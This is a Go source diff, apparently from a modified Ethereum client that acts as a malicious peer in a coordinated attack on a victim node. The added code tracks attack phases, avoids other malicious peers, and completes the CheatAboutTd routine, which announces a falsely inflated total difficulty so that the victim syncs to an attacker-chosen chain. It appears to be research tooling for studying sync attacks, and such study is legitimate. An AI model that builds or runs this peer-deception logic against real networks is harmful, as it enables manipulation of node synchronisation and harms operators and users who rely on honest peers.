@@ -37,9 +37,9 @@ var canServePivoting chan bool
 var canDisconnect chan bool
 var higherTd *big.Int
 var bigOne = big.NewInt(1)
-var bigTwo = big.NewInt(2)
-//var firstTime bool
-var avoidVictim bool
+var avoidVictim bool			// Despite we need to only avoid connecting to the victim in
+								// some moments, when this variable is set the peer will not
+								// accept/dial any new p2p peer.
 var lastOracleBit bool
 
 
@@ -90,7 +90,6 @@ func Initialize(id string) error {
 	canServePivoting = make(chan bool, 1)
 	canDisconnect = make(chan bool)
 	higherTd = utils.HigherTd
-	//firstTime = true
 	avoidVictim = false
 	lastOracleBit = false
 	p2p.NoNewConnections = &avoidVictim
@@ -154,6 +153,7 @@ func SetVictimIfNone(v *p2p.Peer) {
 			}
 		} else if attackPhase == utils.PredictionPhase && lastOracleBit {
 			attackPhase = utils.SyncPhase
+			log("Switched to", attackPhase, "phase")
 		}
 
 		log("Set victim:", vID)
@@ -199,6 +199,10 @@ func NewPeerJoined(peer *p2p.Peer) {
 }
 
 func ServedBatchRequest(from uint64, peerID ...string) {
+	if attackPhase != utils.ReadyPhase && attackPhase != utils.PredictionPhase {
+		fatal(utils.StateError, "No invocation to ServedBatchRequest() should happen in", attackPhase, "phase")
+	}
+
 	select {
 	case <-quitCh:
 		fatal(utils.BridgeClosedErr, "Could not notify served batch request")
@@ -365,19 +369,34 @@ func DoingPrediction() bool {
 	}
 }
 
+func DoingPredictionOrReady() bool {
+	select {
+	case <-quitCh:
+		fatal(utils.BridgeClosedErr, "Could not determine if attack phase is prediction")
+		return false
+		
+	default:
+		return (attackPhase==utils.PredictionPhase || attackPhase==utils.ReadyPhase)
+	}
+}
+
 func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
 	select {
 	case <-quitCh:
-		fatal(utils.BridgeClosedErr, "Could not serve custom chain")
+		fatal(utils.BridgeClosedErr, "Could not serve", chainType, "chain")
 		return nil
 		
 	default:
 		db, err := getChainDatabase(chainType)
 		if err != nil {
-			fatal(err, "Could not serve custom chain")
+			fatal(err, "Could not serve", chainType, "chain")
 		}
 		return db
 	}
+}
+
+func SetTrueChain(db ethdb.Database) {
+	setChainDatabase(db, utils.TrueChain)
 }
 
 func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
@@ -392,11 +411,9 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 		}
 
 		// Don't cheat to other malicious peers!
-		for _, s := range otherMaliciousPeers {
-			if peerID == s {
-				log("Not cheating about TD to peer", peerID)
-				return higherTd, false, nil
-			}
+		if IsMalicious(peerID) {
+			log("Not cheating about TD to peer", peerID)
+			return higherTd, false, nil
 		}
 
 		/*	Don't cheat to nodes already in sync.
@@ -409,11 +426,12 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 			rolling back such blocks. So, the correct threshold to use here is indeed predictionTD.
 		*/
 
-		if attackPhase == utils.PredictionPhase && !lastOracleBit {			// When the non-master peer of the last
-																			// syncOp of the prediction phase
-																			// does the handshake with the victim,
-																			// it already needs to announce the TD for
-																			// the syncPhase.
+		if (attackPhase == utils.PredictionPhase || attackPhase == utils.ReadyPhase) && !lastOracleBit {
+																		// When the non-master peer of the last
+																		// syncOp of the prediction phase
+																		// does the handshake with the victim,
+																		// it already needs to announce the TD for
+																		// the syncPhase.
 			predictionTD := getTd(utils.PredictionChain)
 			if peerTD.Cmp(predictionTD) > 0 {
 				return higherTd, false, nil
@@ -422,16 +440,20 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 			return higherTd, mustCheatAboutTd, nil
 		}
 
-		if attackPhase == utils.PredictionPhase && lastOracleBit {
-			//TODO
+		if (attackPhase == utils.PredictionPhase && lastOracleBit) || attackPhase == utils.SyncPhase {
+			td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
+			log("Cheating to peer", peerID, "if necessary at this point")
+			return td, mustCheatAboutTd, nil
 		}
 	}
 	return higherTd, mustCheatAboutTd, nil // This line is wrong, just to return smthg
 }
 
+/*
 func AvoidVictim() bool {
 	return avoidVictim
 }
+*/
 
 /*
 func GetHigherHeadAndPivot() (*types.Header, *types.Header) {
@@ -487,6 +509,7 @@ func SendOracleBit(bit byte) {
 
 	if lastOracleBit {
 		attackPhase = utils.SyncPhase
+		log("Switched to", attackPhase, "phase")
 	}
 }
 
@@ -607,6 +630,8 @@ func handleMessages() {
 			switch message.Code {
 			case msg.NextPhase.Code:
 				attackPhase += 1
+				// What about setting mustChangeAttackChain here?
+				// For now msg.NextPhase is never used, so we don't care.
 			case msg.SetCheatAboutTd.Code:
 				switch message.Content[0] {
 				case 0:
@@ -641,7 +666,7 @@ func handleMessages() {
 				if newAttackPhase != attackPhase {
 					attackPhase = newAttackPhase
 					log("Attack phase switched to", attackPhase)
-					if attackPhase != utils.StalePhase {
+					if attackPhase != utils.StalePhase && attackPhase != utils.SyncPhase {
 						mustChangeAttackChain = true
 					}
 				}
